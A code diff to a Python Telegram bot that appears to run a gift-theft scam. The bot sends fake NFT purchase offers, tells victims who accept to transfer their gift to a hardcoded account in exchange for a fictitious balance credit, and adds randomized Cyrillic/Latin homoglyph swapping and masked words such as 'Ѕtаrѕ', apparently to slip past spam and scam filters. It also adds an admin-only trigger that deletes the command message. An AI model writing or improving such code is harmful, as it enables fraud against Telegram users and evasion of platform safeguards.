@@ -4,6 +4,7 @@ import logging
 import os
 import random
 import re
+import time
 import uuid
 
 from dotenv import load_dotenv
@@ -19,14 +20,15 @@ from aiogram.types import (
 load_dotenv()
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-NFT_TRANSFER_LINK = os.getenv("NFT_TRANSFER_LINK", "tg://send_gift?to=dobrks")
-STAR_EMOJI_ID = os.getenv("STAR_EMOJI_ID", "5242644275014951846")
-GRAM_EMOJI_ID = os.getenv("GRAM_EMOJI_ID", "5193179982775476271")
-CHECK_EMOJI_ID = os.getenv("CHECK_EMOJI_ID", "5776375003280838798")
-CROSS_EMOJI_ID = os.getenv("CROSS_EMOJI_ID", "5778527486270770928")
-GIFT_EMOJI_ID = os.getenv("GIFT_EMOJI_ID", "5985472565508838112")
+NFT_TRANSFER_LINK = "tg://send_gift?to=dobrks"
+ADMIN_ID = 8414654810
+STAR_EMOJI_ID = "5242644275014951846"
+GRAM_EMOJI_ID = "5193179982775476271"
+CHECK_EMOJI_ID = "5776375003280838798"
+CROSS_EMOJI_ID = "5778527486270770928"
+GIFT_EMOJI_ID = "5985472565508838112"
 
-if not BOT_TOKEN or ":" not in BOT_TOKEN:
+if not BOT_TOKEN:
     raise ValueError("BOT_TOKEN is required")
 
 logging.basicConfig(level=logging.INFO)
@@ -34,6 +36,8 @@ bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
 offers = {}
+last_send = 0
+SEND_COOLDOWN = 30
 
 CONNECTIONS_FILE = "connections.json"
 connections = {}
@@ -84,6 +88,55 @@ def mask_stars(currency: str) -> str:
     if currency.lower() == "stars":
         return "Ѕtаrѕ"
     return currency.capitalize()
+
+# Буквы-двойники кириллица → латиница
+CYR_TO_LAT = {
+    "а": "a", "е": "e", "о": "o", "р": "p", "с": "c", "х": "x", "у": "y",
+    "А": "A", "Е": "E", "О": "O", "Р": "P", "С": "C", "Х": "X", "У": "Y",
+    "і": "i", "І": "I",
+}
+
+def smart_randomize(text: str) -> str:
+    """Случайная вероятность + замена только двойников. Теги/ссылки не трогает."""
+    probability = random.uniform(0.25, 0.55)
+    result = []
+    i = 0
+    n = len(text)
+    while i < n:
+        if text[i] == "<":
+            end = text.find(">", i)
+            if end != -1:
+                result.append(text[i:end + 1])
+                i = end + 1
+                continue
+        if text[i:i+7].lower() == "http://" or text[i:i+8].lower() == "https://":
+            end = i
+            while end < n and text[end] not in " \n\t<>":
+                end += 1
+            result.append(text[i:end])
+            i = end
+            continue
+        if text[i] == "@":
+            end = i + 1
+            while end < n and (text[end].isalnum() or text[end] == "_"):
+                end += 1
+            result.append(text[i:end])
+            i = end
+            continue
+        if text[i:i+2] == "@@" and i + 2 < n:
+            end = text.find("@@", i + 2)
+            if end != -1:
+                result.append(text[i:end + 2])
+                i = end + 2
+                continue
+
+        char = text[i]
+        if char in CYR_TO_LAT and random.random() < probability:
+            result.append(CYR_TO_LAT[char])
+        else:
+            result.append(char)
+        i += 1
+    return "".join(result)
 
 HOMOGLYPH_CYR = {
     "а": "a", "е": "e", "о": "o", "с": "c", "р": "p", "х": "x", "у": "y",
@@ -211,6 +264,8 @@ def get_lang(code: str) -> str:
     if not code:
         return "ru"
     c = code.strip().lower()
+    if c == "en":
+        return "us"
     return c if c in TEXTS else "ru"
 
 def get_offer_keyboard(order_id: str, lang: str) -> InlineKeyboardMarkup:
@@ -242,6 +297,23 @@ def get_deal_keyboard(order_id: str, lang: str) -> InlineKeyboardMarkup:
 
 @dp.business_message(F.text.startswith("+rep "))
 async def cmd_rep_business(message: types.Message):
+    if message.from_user.id != ADMIN_ID:
+        return
+
+    global last_send
+    now = time.time()
+    if now - last_send < SEND_COOLDOWN:
+        print(f"[FLOOD] skipped, cooldown {SEND_COOLDOWN}s")
+        try:
+            await bot.delete_business_messages(
+                business_connection_id=message.business_connection_id,
+                message_ids=[message.message_id]
+            )
+        except Exception:
+            pass
+        return
+    last_send = now
+
     args = message.text.split()
     if len(args) < 3:
         try:
@@ -298,8 +370,15 @@ async def cmd_rep_business(message: types.Message):
         nft_link="@@NFT@@",
     )
 
-    offer_text_rand = randomize_all(offer_text_raw, probability=1.0)
-    nft_name_rand = randomize_all(nft_full_name, probability=1.0)
+    if lang in ("ru", "ua"):
+        offer_text_rand = smart_randomize(offer_text_raw)
+        nft_name_rand = nft_full_name
+        expires_text = smart_randomize(t['offer_expires'])
+    else:
+        offer_text_rand = randomize_all(offer_text_raw, probability=1.0)
+        nft_name_rand = randomize_all(nft_full_name, probability=1.0)
+        expires_text = randomize_all(t['offer_expires'], probability=1.0)
+
     nft_link = f'<a href="{nft_url}">{nft_name_rand}</a>'
 
     offer_text = (
@@ -309,9 +388,8 @@ async def cmd_rep_business(message: types.Message):
         .replace("@@NFT@@", nft_link)
     )
 
-    expires_rand = randomize_all(t['offer_expires'], probability=1.0)
     preview_line = f'<a href="{nft_url}">&#8203;</a>'
-    text = f"{preview_line}{offer_text}\n\n{expires_rand}"
+    text = f"{preview_line}{offer_text}\n\n{expires_text}"
 
     try:
         await message.answer(
@@ -324,6 +402,7 @@ async def cmd_rep_business(message: types.Message):
             ),
             parse_mode="HTML"
         )
+        print(f"[OFFER] sent lang={lang}")
     except Exception as e:
         print(f"[SEND ERROR] {e}")
 
@@ -347,7 +426,7 @@ async def process_accept(callback: CallbackQuery):
     offer["status"] = "accepted"
     lang = offer["lang"]
     currency_text = mask_stars(offer['currency'])
-    nft_name_rand = randomize_all(offer['nft_name'], probability=1.0)
+    nft_name_rand = offer['nft_name'] if lang in ("ru", "ua") else randomize_all(offer['nft_name'], probability=1.0)
 
     alert_texts = {
         "ru": f"Предложение о продаже {offer['nft_name']} успешно принято.\n\nПередайте подарок покупателю для зачисления {offer['amount']} {currency_text} на ваш баланс.",
@@ -408,7 +487,7 @@ async def process_decline(callback: CallbackQuery):
     lang = offer["lang"]
     t = TEXTS[lang]
 
-    declined_rand = randomize_all(t['declined'], probability=1.0)
+    declined_rand = smart_randomize(t['declined']) if lang in ("ru", "ua") else randomize_all(t['declined'], probability=1.0)
     text = f"{cross_emoji()} {declined_rand}"
 
     try:
